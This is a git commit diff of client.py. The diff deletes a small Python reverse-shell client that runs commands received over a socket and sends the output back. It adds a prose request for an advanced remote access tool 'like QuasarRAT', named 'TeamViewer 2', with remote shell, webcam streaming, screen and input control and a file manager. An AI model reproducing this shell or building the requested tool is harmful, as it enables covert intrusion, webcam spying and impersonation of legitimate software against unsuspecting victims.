ac235f8d8b52a1cf756cbd5461fee04785043a16
mephisto-v <agentunknown@infopeklo.cz>
2025-03-08 13:01:43 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,21 +1,10 @@
-import socket
-import os
-import subprocess
+create a remote access tool a client(app) and server (GUI) app named TeamViewer 2 like TeamViewer 1 or QuasarRAT the server will be n GUI                                                               
+ Features: 
+📂 File Manager (Browse files)                                                                                                             🔐Encrypted communication (TLS)
+🎥 Remote Desktop (Screen streaming, Webcam, mouse, and keyboard control)
+📷 Webcam stream                                                                                                                                           
 
-server_ip = '127.0.0.1'
-server_port = 9999
+🖥️ Remote Shell (Send CLI commands)
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((server_ip, server_port))
-
-while True:
-    try:
-        command = client_socket.recv(1024).decode()
-        if command.startswith('cd '):
-            os.chdir(command[3:])
-            client_socket.send(b'Changed directory')
-        else:
-            output = subprocess.getoutput(command)
-            client_socket.send(output.encode())
-    except:
-        break
+👥 Client List (See connected clients)
+Note: The client can't do nothing. make it advanced like QuasarRAT  and like rdp what laguages do you RECOMMEND me
